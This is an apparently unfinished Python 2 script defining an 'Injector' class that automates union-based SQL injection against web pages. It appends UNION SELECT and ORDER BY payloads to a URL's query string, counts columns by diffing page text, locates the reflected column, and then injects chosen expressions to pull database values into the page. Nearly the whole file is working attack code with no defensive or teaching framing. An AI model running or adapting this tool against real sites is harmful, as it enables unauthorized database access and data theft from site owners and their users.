#!/usr/bin/python
""" Used for basic union-based SQL injection.

"""
from BeautifulSoup import BeautifulSoup    
import os, sys, urllib2
import operator
import json
import re
from collections import Counter
    
class Injector:
    
    # Pass dict of options as param flags
    def __init__(self, flags):
        self.flags = flags 
        self.offset = 0 # can be changed to say, self.offset, if 1,2,3,4... found on page a lot
        self.columns_upper_limit_guess = 9
        #self.delimiter = '%20' #Can also be '/**/'
        self.delimiter = '/**/' #Can also be '/**/'

    def get_page(self, page):
        """ Grab page with urllib and split on whitespace.
            :page: string representing url to be parsed
            :throws: HTTPError.
            :returns: list representing page's text
        """
        if 'http://' not in page:
            page = 'http://' + page
    
        # Try to get HTML, read if successful
        try:
            html = urllib2.urlopen(page).read()
            message = '\n'.join(BeautifulSoup(html).findAll(text=True))
        except urllib2.HTTPError as e:
            print e
    
        return message.split()
    
    # Diff two html lists by turning into sets and taking difference.
    # First param should be before injection, 2nd param after.
    # Returns list representing difference between the two pages.
    def html_diff(self, before_injection, after_injection):
        diff = list(set(after_injection) - set(before_injection))

        return diff
    
    # Try unions until no SQL errors returned.
    # Return number of columns in exposed table.
    # Can test using:
    #   i)  UNION SELECT [1],[1,2],...
    #   ii) ORDER BY [1],[2],...
    #
    def get_num_columns(self, page):
        count = 1
    
        original_page = self.get_page(page)
        ### Using UNION SELECT appending 1,2,... ###
        union = page + '%20UNION%20SELECT%201'

        ### Heuristic just looks for SELECT or empty list, needs to be MORE NUANCED!

        while len(self.html_diff(original_page, self.get_page(union))) == 0 or 'SELECT' in self.html_diff(original_page, self.get_page(union)):
            count += 1
            union += ',%20' + str(count + self.offset)

        """
        ### Using ORDER BY x--, x = 9,8,... ###
        count = self.columns_upper_limit_guess
        order_by = page + self.delimiter + 'ORDER' + self.delimiter + 'BY' + self.delimiter + str(count) + '--'
        while 'Unknown' in self.html_diff(original_page, self.get_page(order_by)) and count > 0:
            count -= 1
            temp = list(order_by)
            temp[-3] = str(count)
            order_by = "".join(temp)
        """
    
        return count
    
    def get_visible_param(self, page):
        """ Get most common number appearing in HTML, this is where to inject variables.
            :page: List of HTML lines.
            :returns: Most commonly seen number in page, hopefully the injectable param.
        """
        
        # Make query string
        union_urls = ['%20' + str(i + self.offset) for i in xrange(1, self.get_num_columns(page) + 1)]
        new_url = page.split('=')[0] + '=null' + '%20UNION%20SELECT' + ",".join(union_urls)

        diff = self.html_diff(self.get_page(page), self.get_page(new_url))
        nums = [filter(str.isdigit, str(re.sub('<.*>','', line))) for line in diff]
        #nums.remove('')

        return Counter(nums).most_common(1)[0][0]
        
    
    # Takes page to fuzz for injections and params to check for.
    # Returns dict of lists, keys are injected strings, values are results.
    def injection(self, page, params):
        columns = self.get_num_columns(page)
        page1 = self.get_page(page)
        data = {}
        magic_number = int(self.get_visible_param(page))
    
        union_urls = ['%20' + str(i + self.offset) for i in xrange(1, columns + 1)]
        for param in params:
            data[param] = []
            union_urls[magic_number - 1] = '%20' + param

            new_url = page.split('=')[0] + '=null' + '%20UNION%20SELECT' + ",".join(union_urls)
            data[param] = (self.html_diff(page1, self.get_page(new_url)))
    
        return data
    

    #
